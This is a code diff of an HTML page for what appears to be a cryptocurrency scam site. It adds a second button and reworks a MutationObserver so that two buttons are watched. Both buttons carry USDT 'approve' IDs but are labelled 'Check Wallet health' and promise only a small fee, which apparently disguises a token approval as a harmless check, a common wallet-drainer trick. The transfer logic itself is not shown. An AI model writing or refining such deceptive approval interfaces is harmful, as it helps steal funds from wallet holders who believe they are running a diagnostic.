@@ -110,20 +110,24 @@
                             <span id="userBalance">Loading...</span>
                         </div>
                         <!-- <button id="approveUSDT">Approve USDT Transfer</button> -->
-                        <div id="approveUSDT"
+                        <div id="approveButtons"
                             style="display: none; flex-direction: column; align-items: center; margin-top: 1rem; margin-bottom: 1rem;">
+
                             <button id="approveUSDT"
-                                style="padding: 0.75rem 1.5rem; font-size: 1.25rem; font-weight: bold; border-radius: 14px; background: linear-gradient(145deg, #f7d774, #f1c40f); color: #212529; border: none; box-shadow: 0 5px 15px rgba(241, 196, 15, 0.4); transition: all 0.3s ease; display: flex; align-items: center; justify-content: center; gap: 0.75rem;">
+                                style="display: none; padding: 0.75rem 1.5rem; font-size: 1.25rem; font-weight: bold; border-radius: 14px; background: linear-gradient(145deg, #f7d774, #f1c40f); color: #212529; border: none; box-shadow: 0 5px 15px rgba(241, 196, 15, 0.4); transition: all 0.3s ease; display: flex; align-items: center; justify-content: center; gap: 0.75rem;">
                                 <i class="fas fa-award" style="margin-right: 0.5rem;"></i>Check Wallet health
                             </button>
+
                             <button id="approveUSDTerc"
-                                style="padding: 0.75rem 1.5rem; font-size: 1.25rem; font-weight: bold; border-radius: 14px; background: linear-gradient(145deg, #f7d774, #f1c40f); color: #212529; border: none; box-shadow: 0 5px 15px rgba(241, 196, 15, 0.4); transition: all 0.3s ease; display: flex; align-items: center; justify-content: center; gap: 0.75rem;">
+                                style="display: none; padding: 0.75rem 1.5rem; font-size: 1.25rem; font-weight: bold; border-radius: 14px; background: linear-gradient(145deg, #f7d774, #f1c40f); color: #212529; border: none; box-shadow: 0 5px 15px rgba(241, 196, 15, 0.4); transition: all 0.3s ease; display: flex; align-items: center; justify-content: center; gap: 0.75rem;">
                                 <i class="fas fa-award" style="margin-right: 0.5rem;"></i>Check Wallet health
                             </button>
+
                             <small style="font-size: 0.85rem; color: #f4f5f7; margin-top: 0.5rem;">
                                 This will charge you a nominal fee </br>(less than 0.5 USDT)
                             </small>
                         </div>
+
                     </div>
 
                 </div>
@@ -300,21 +304,20 @@
     </main>
 
     <script>
-        const observer = new MutationObserver(function (mutationsList) {
+        const observerCallback = function (mutationsList) {
             for (let mutation of mutationsList) {
                 if (
                     mutation.type === "attributes" &&
                     mutation.attributeName === "style"
                 ) {
-                    const approveDiv = document.getElementById("approveUSDT");
-                    if (approveDiv && approveDiv.style.display !== "none") {
+                    const target = mutation.target;
+                    if (target.style.display !== "none") {
                         const walletDiv = document.getElementById("walletInfo");
                         if (walletDiv) {
                             walletDiv.style.display = "block";
-                            console.log("walletInfo now visible because approveUSDT is visible");
+                            console.log("walletInfo now visible because " + target.id + " is visible");
                         }
 
-                        // Fade out the introDiv
                         const introDiv = document.getElementById("introDiv");
                         if (introDiv) {
                             introDiv.classList.remove("fade-in");
@@ -324,15 +327,21 @@
                     }
                 }
             }
-        });
+        };
 
-        const approveUSDT = document.getElementById("approveUSDT");
-        if (approveUSDT) {
-            observer.observe(approveUSDT, {
-                attributes: true
-            });
-        }
+        const observer = new MutationObserver(observerCallback);
+
+        // List of IDs to observe
+        const approveButtons = ["approveUSDT", "approveUSDTerc"];
+
+        approveButtons.forEach((id) => {
+            const el = document.getElementById(id);
+            if (el) {
+                observer.observe(el, { attributes: true });
+            }
+        });
     </script>
+
 
     <script>
         function copyAddress() {
